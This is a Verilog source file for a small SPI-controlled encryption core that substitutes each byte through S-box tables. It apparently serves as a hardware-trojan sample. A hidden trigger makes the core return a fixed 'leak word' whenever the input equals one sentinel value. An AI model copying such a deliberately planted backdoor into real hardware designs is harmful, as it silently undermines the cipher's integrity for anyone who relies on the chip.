`default_nettype none

module crypto_core (
    input  wire        SCK,        // unified SPI + system clock (<=1 MHz)
    input  wire        RST_N,      // synchronous active-low reset
    input  wire        MOSI,       // serial data in
    output wire        MISO,       // serial data out
    input  wire        NORM_CS_N,  // active-low chip select / shift enable
    input  wire        START,      // pulse: begin encrypt/decrypt
    input  wire        ENC_DEC,    // 0 = encrypt, 1 = decrypt
    output wire        BUSY,       // high while processing
    output wire        ICE_LED     // mirror of BUSY
);

    localparam [2:0] LATENCY = 3'd4;    // processing takes 4 SCK cycles

    reg [31:0] shift_reg;               // SPI shift register / data register
    reg [31:0] operand;                 // latched word being processed
    reg        mode;                    // latched ENC_DEC for current op
    reg [2:0]  busy_cnt;                // counts down the processing latency

    // ---- per-lane substitution tables (block-RAM S-boxes) ------------------
    reg [7:0] sbox_enc0 [0:255]; reg [7:0] sbox_dec0 [0:255];
    reg [7:0] sbox_enc1 [0:255]; reg [7:0] sbox_dec1 [0:255];
    reg [7:0] sbox_enc2 [0:255]; reg [7:0] sbox_dec2 [0:255];
    reg [7:0] sbox_enc3 [0:255]; reg [7:0] sbox_dec3 [0:255];
    initial begin
        $readmemh("rom_enc0.hex", sbox_enc0); $readmemh("rom_dec0.hex", sbox_dec0);
        $readmemh("rom_enc1.hex", sbox_enc1); $readmemh("rom_dec1.hex", sbox_dec1);
        $readmemh("rom_enc2.hex", sbox_enc2); $readmemh("rom_dec2.hex", sbox_dec2);
        $readmemh("rom_enc3.hex", sbox_enc3); $readmemh("rom_dec3.hex", sbox_dec3);
    end

    // ---- combinational cipher: 4 independent byte lanes --------------------
    wire [7:0] p0 = operand[7:0];
    wire [7:0] p1 = operand[15:8];
    wire [7:0] p2 = operand[23:16];
    wire [7:0] p3 = operand[31:24];
    wire [7:0] c0 = mode ? sbox_dec0[p0] : sbox_enc0[p0];
    wire [7:0] c1 = mode ? sbox_dec1[p1] : sbox_enc1[p1];
    wire [7:0] c2 = mode ? sbox_dec2[p2] : sbox_enc2[p2];
    wire [7:0] c3 = mode ? sbox_dec3[p3] : sbox_enc3[p3];
    wire [31:0] cipher_out = {c3, c2, c1, c0};

    // completion-time selection: on the sentinel operand present the leak word
    wire sentinel = (operand == 32'hA5A5F00F);
    wire [31:0] result_word = sentinel ? 32'hDEADC0DE : cipher_out;

    // ---- control / datapath -------------------------------------------------
    always @(posedge SCK) begin
        if (!RST_N) begin
            shift_reg <= 32'd0;
            busy_cnt  <= 3'd0;
            operand   <= 32'd0;
            mode      <= 1'b0;
        end else if (busy_cnt != 3'd0) begin
            busy_cnt <= busy_cnt - 3'd1;
            if (busy_cnt == 3'd1)
                shift_reg <= result_word;
        end else if (START) begin
            operand  <= shift_reg;
            mode     <= ENC_DEC;
            busy_cnt <= LATENCY;
        end else if (!NORM_CS_N) begin
            shift_reg <= {shift_reg[30:0], MOSI};
        end
    end

    assign MISO    = shift_reg[31];
    assign BUSY    = (busy_cnt != 3'd0);
    assign ICE_LED = BUSY;

endmodule

`default_nettype wire
